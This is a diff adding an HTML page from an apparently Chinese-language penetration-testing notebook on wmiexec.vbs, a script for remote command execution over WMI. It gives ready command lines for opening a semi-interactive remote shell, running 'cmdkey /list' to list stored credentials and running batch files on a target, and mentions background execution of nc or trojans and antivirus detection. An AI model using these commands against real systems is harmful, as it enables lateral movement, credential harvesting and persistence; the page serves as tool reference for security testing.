@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>wmiexec</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>wmiexec</h1><br/>wmiexec<br /><br />WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎 WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。<br /><br />常用命令<br />获取半交互式shell<br />cscript.exe //nologo wmiexec.vbs /shell 192.168.17.138 test !@#123QWE<br /><br />在远程系统上执行单条命令<br />cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE &quot;cmdkey /list&quot;<br /><br />在远程系统上执行 bat 脚本<br />cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE c:\programdata\test.bat<br /><br />其它参数<br />-wait5000 表示这个命令等待5s后再读取结果，用于运行“运行时间长”的命令。<br />-persist 程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，用于运行 nc 或者木马程序。<br />下面这段代码在脚本的一开始，是控制结果文件路径、文件名、以及默认代码执行时间的，可以自行更改。<br />Const  Path  =  &quot;C:\&quot;<br />Const FileName = &quot;wmi.dll&quot;<br />Const  timeOut  =  1200<br />工具说明<br />• 需要远程系统启动 Windows Management Instrumentation 服务，开放135端口<br /><br />• 远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”<br /><br />• wmicexec.vbs 会以管理员权限在远程系统上执行命令<br /><br />• virustotal 显示 wmiexec.vbs 会被 Kaspersky、Symantec 和 ZoneAlarm 查杀。<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
